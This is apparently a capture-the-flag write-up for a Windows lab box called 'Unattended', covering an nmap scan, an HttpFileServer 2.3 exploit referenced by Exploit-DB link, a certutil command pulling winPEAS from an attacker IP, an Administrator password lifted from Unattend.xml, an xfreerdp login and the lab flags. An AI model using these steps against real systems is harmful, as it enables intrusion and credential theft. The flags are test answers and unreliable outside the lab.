# UNATTENDED

![](../.gitbook/assets/58f89e777e384287b47f600f6e74e1b1.png)

## NMAP SCAN

```text
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

## PORT 80 ENUMERATION

* HttpFileServer 2.3

![](../.gitbook/assets/77b233a454c242ad8d1d91bee74ac299.png)

![](../.gitbook/assets/84d7f10232354ad691e92d45c119e426.png)

## EXPLOIT WITHOUT METASPLOIT

* [https://www.exploit-db.com/exploits/39161](https://www.exploit-db.com/exploits/39161)

![](../.gitbook/assets/69e29895ed504790a1080e0d7eda9559.png)



* WATCH THE NUMBER OF TRYS \(8\)

![](../.gitbook/assets/1541b4725c9f405ca2d361a33a809e93.png)

## WINPEAS

```text
certutil -urlcache -f http://10.10.0.63:8000/winPEASx64.exe winpeas.exe
```

![](../.gitbook/assets/9870e88053cd44269e26210d2ae547ff.png)

![](../.gitbook/assets/3aca649b350447cb81be7bb2b216d4d9.png)

![](../.gitbook/assets/002ad37dcba3483695266d61c69b29bd.png)

* C:\Windows\Panther\Unattend.xml

![](../.gitbook/assets/9feb1c1b324e4292853b2e16b71ec41b.png)

```text
Administrator:cnt4weRAbtXMTSVV
```

## PRIVESC

![](../.gitbook/assets/9940717168b240efaedbce03d6e1f8fe.png)

* OR 

```text
xfreerdp /u:Administrator /p:cnt4weRAbtXMTSVV /cert:ignore /v:172.31.1.24
```

![](../.gitbook/assets/6986293f44e04528834e83fb5d476ab2.png)

## FLAGS

### USER

```text
423b6ee873126a02f27afe8a4273e1ad
```

### ROOT

```text
e594fe8b3544d60110f79bb58245cbfd
```

![](../.gitbook/assets/f32977a349284be88d518e76148423c6.png)

